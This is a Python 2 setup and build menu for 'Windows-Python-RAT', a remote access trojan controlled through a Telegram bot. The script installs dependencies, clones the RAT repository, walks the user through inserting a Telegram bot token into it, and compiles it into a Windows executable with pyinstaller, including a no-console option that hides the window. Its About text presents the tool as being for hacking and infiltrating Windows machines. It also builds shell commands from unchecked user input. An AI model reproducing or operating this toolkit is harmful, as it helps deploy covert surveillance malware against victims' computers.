#########################################################
# Windows-Python-RAT Setup                              #
# [R]emote [A]dministrator [T]ool                   	#
# GitHub: https://github.com/Windows-Python-RAT         #
# ##################################################### #
# Coded By Sir.4m1R (Amir Hossein Yeganeh)          	#
# Telegram:        @Sir4m1R                         	#
# Email:           Sir.4m1R@Gmail.Com               	#
# ##################################################### #
# Developed By Hanieh Panahi                            #
# Telegram:        @Hanie0101                           #
# ##################################################### #
# The404Hacking                                     	#
# Digital Security ReSearch Group                   	#
# ##################################################### #
# Telegram:        https://Telegram.me/The404Hacking    #
# Instagram:       https://instagram.com/The404Hacking  #
# Aparat:          http://aparat.com/The404Hacking  	#
# YouTube:         http://yon.ir/youtube404         	#
# GitHub:          https://github.com/The404Hacking     #
# LahzeNegar       https://lahzenegar.com/The404Hacking #
# Email:           The404Hacking.Team@Gmail.Com         #
#########################################################
import os
import platform
import urllib

def clear():
	linux = 'clear'
	windows = 'cls'
	os.system([linux, windows][os.name == 'nt'])
clear()
print "\n [***] Please wait ...\n\n"
#data = urllib.urlopen("https://api.ipify.org/")
#ip = data.read()
#os.system("python -m pip install wget")
clear()
banner = '\n'
banner += ' Hi '+platform.uname()[1]+' !\n'
#banner += ' Your IP: '+ip+' !\n'
banner += ' WelCome to Windows-Python-RAT Setup.\n'
banner += ' ------------------------------------\n'
banner += ' Coder: Sir.4m1R (@Sir4m1R)\n'
banner += ' --------------------------\n'
banner += ' The404Hacking\n'
banner += ' Digital Security ReSearch Group\n'
banner += ' ------------------------------------\n'
banner += ' Select a Options:\n'
banner += ' [1] Install Module.\n'
banner += ' [2] Clone again [for Linux].\n'
banner += ' [3] Report Bug.\n'
banner += ' [4] Create Bot.\n'
banner += ' [5] Compile py File [pyinstaller].\n'
banner += ' [6] Windows-Python-RAT GitHub.\n'
banner += ' [7] About.\n'
banner += ' [0] Exit.\n'
print banner
number = input(" [?] WinRAT-Setup~# ")

if number == 1:
	clear()
	print "\n [***] Please wait ...\n\n"
	os.system("python -m pip install --upgrade pip")
	os.system("python -m pip install python-telegram-bot")
	os.system("python -m pip install pyttsx")
	os.system("python -m pip install autopy")
	os.system("python -m pip install pyinstaller")
	print '\n\n [+] Installation Completed !\n'
	quit()

elif number == 2:
	clear()
 	if os.name == "nt":
 		print "\n [***] Please wait ...\n\n [X] Error !\n [!] This Method for Linux and Run in Linux Machine !\n"
 		quit()
 	elif os.name != "nt":
 		print "\n [***] Please wait ...\n\n"
 		os.system("git clone https://github.com/The404Hacking/Windows-Python-RAT.git")
 		print '\n\n [+] Windows-Python-RAT Cloned !\n Git: https://github.com/The404Hacking/Windows-Python-RAT\n'
 		quit()
elif number ==3:
	clear()
	reportbug = '''
 Hi !
 For Reporting a Bug, Send Mail to:
 The404Hacking.Team@Gmail.Com
	or
 Send Message to Telegram:
 https://T.me/Sir4m1R
'''
	print reportbug
	quit()
elif number == 4:
	clear()
	createbot = '''
 Hi
 Create Telegram Bot with @BotFather
 -----------------------------------
 [1] Go to https://t.me/BotFather and Send /start Command.
 [2] Type a Name and Send to BotFather
 [3] Select a Username. It must end in 'bot'.
 (Ex: Samplebot or Sample_bot)
 [4] BotFather send for you a API-TOKEN.
 (Ex: 549710235:AAF-cjA1A-upWOZs8y96Qv2AMpQrGJLH6Xo)

 [+] Good :D, Replace Your API-Token in Windows-Python-RAT.py ! (Line: 35)
'''
	print createbot
 	def edit():
 		linux = 'gedit Windows-Python-RAT.py'
 		windows = 'notepad Windows-Python-RAT.py'
 		os.system([linux, windows][os.name == 'nt'])
 	edit()
	quit()
elif number == 5:
	clear()
	installer = '''
 Welcome to Compiler [py2exe]
 ----------------------------
 Select a Method:
 [1] Console
 [2] No-Console'''
	print installer
	num = input("\n [?] WinRAT-Setup~# ")
	if num == 1:
		print "\n Console Method:"
		iconadrs = raw_input(" [?] Icon [*.ico] Address: ")
		pyadrs = raw_input(" [?] Python [*.py] Address: ")
		pyname = raw_input(" [?] Python File [*.py] Name: ")
		print "\n [***] Please wait ...\n\n"
		os.system("pyinstaller -i "+iconadrs+" -F "+pyadrs)
		exe1 = pyname
		rexe = exe1.replace(".py" , "")
		clear()
		address1 = '\n [Ok] Python Script Console Compile Successfully !\n [+] Directory: \dist\n [+] File: {}.exe\n\n'.format(rexe)
		print address1
		quit()
	elif num == 2:
		print "\n No Console Method:"
		iconadrs2 = raw_input(" [?] Icon [*.ico] Address: ")
		pyadrs2 = raw_input(" [?] Python [*.py] Address: ")
		pyname2 = raw_input(" [?] Python File [*.py] Name: ")
		print "\n [***] Please wait ...\n\n"
		os.system("pyinstaller -i "+iconadrs2+" --noconsole -F "+pyadrs2)
		exe2 = pyname2
		rexe2 = exe2.replace(".py" , "")
		#clear()
		address2 = '\n [Ok] Python Script No-Console Compile Successfully !\n [+] Directory: \dist\n [+] File: {}.exe\n\n'.format(rexe2)
		print address2
		quit()
	else:
		quit()

elif number == 6:
	clear()
	txtgit = '''
 Hi !
 Windows-Python-RAT
 ------------------
 Download or Clone This RAT in Your Machine :)

 Select a options:
 [1] Clone [for Linux]
 [2] Download [for Windows]
'''
	print txtgit
	numbr = input(" [?] WinRAT-Setup~# ")
	if numbr == 1:
		clear()
		print "\n [***] Please wait ...\n\n"
		os.system("git clone https://github.com/The404Hacking/Windows-Python-RAT.git")
		print "\n\n [+] Clone Successfully !\n"
		quit()
	elif numbr == 2:
		print "\n [***] Please wait ...\n\n"
		os.system("start https://github.com/The404Hacking/Windows-Python-RAT/master/archive.zip")
		print "\n\n [+] Download Successfully !\n"
		quit()
	else:
		quit()
elif number == 7:
	clear()
	about_text = "\n"
	about_text += " Hi "+platform.uname()[1]+" !\n"
	about_text += " WelCome to Windows-Python-RAT About :)\n"
	about_text += "\n"
	about_text += " This RAT Created by Sir.4m1R.\n"
	about_text += " This is a RAT for Computer Hacking and Infiltration with Microsoft Windows\n Operating Systems.\n"
	about_text += "\n"	
	about_text += " Using this tool, you can easily perform the Penetration Test on Windows\n and get the commands that are registered in the management robot to get\n the Information you want from the Control Panel Robot (Robot management RAT).\n"
	about_text += "\n"
	about_text += " This RAT is controlled by a robot in the Telegram. For the robot to work\n and send Information and logs to you in a telegram, you just have to create\n a Robot in the Telegram with @BotFather robot.\n"
	about_text += "\n"
	about_text += "\n"
	about_text += " Powered By Sir.4m1R.\n"
	about_text += " Developed By Hanieh Panahi\n"
	about_text += " Copyright (C) 2018 The404Hacking.\n"
	print about_text
elif number == 0:
	print "\n Good Bye "+platform.uname()[1]+" :)\n"
else:
	print " Error !"
	quit()
